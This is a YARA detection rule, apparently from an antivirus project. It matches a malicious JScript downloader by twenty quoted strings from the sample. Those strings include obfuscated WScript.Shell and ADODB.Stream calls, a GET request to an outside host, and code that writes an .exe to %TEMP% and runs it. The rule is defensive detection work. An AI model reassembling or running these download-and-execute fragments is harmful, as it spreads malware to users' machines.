rule sig_20160401_a5145d225cee456f1783ae1f1bdf7dfd {
  meta:
    description = "datamaliciousorder - file 20160401_a5145d225cee456f1783ae1f1bdf7dfd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d39b1a8e46a4c8ac9077b3c6ca3307fcd03a631d365bb9e6af15072ceba7abe"

  strings:
    $s1  = "var ImIk = function JiKkq() {return WScript[GiaCbt](\"WScript\"+\".Shell\");}(), ZbGu = 11;" fullword ascii
    $s2  = "function KoQp(EqEi, UvpZa){EcuPdc = EcuPdc * 1; return EqEi - UvpZa;};" fullword ascii
    $s3  = "if (VjVmw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "VjVmw[XpDuq](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s5  = "PoLo = WScript[TbWdg()](\"A\"+\"DODB.Stream\");" fullword ascii
    $s6  = "function XxrCf(){return JpXgs + \"\";};" fullword ascii
    $s7  = "function CkjRch() {return ImIk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OGPylXgoolp.ex\" + \"e\";};" fullword ascii
    $s8  = "function TbkQy() {return ((OvuUgo == true) && (OvuUgo == EooRq)) ? 1 : EcuPdc;};" fullword ascii
    $s9  = "function GtqBys(CobUiq) {var MzBa = (1, 2, 3, 4, 5, CobUiq); return MzBa;};" fullword ascii
    $s10 = "OvuUgo = true; " fullword ascii
    $s11 = "var EooRq = false;" fullword ascii
    $s12 = "var GvqIeq = false;" fullword ascii
    $s13 = "}while (YcRte);" fullword ascii
    $s14 = "var OvuUgo = false;" fullword ascii
    $s15 = "function GrfCu(TsEi){ImIk[\"R\"+\"un\"](TsEi, EcuPdc, EcuPdc);};" fullword ascii
    $s16 = "return KoQp(PsfLy, NlvPq);" fullword ascii
    $s17 = "PoLo[\"clo\"+\"se\"]();" fullword ascii
    $s18 = "function TbWdg(){return GiaCbt;};" fullword ascii
    $s19 = "var EoHmw = new this[\"Date\"]();" fullword ascii
    $s20 = "PoLo[\"position\"] = GtqBys(EcuPdc);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}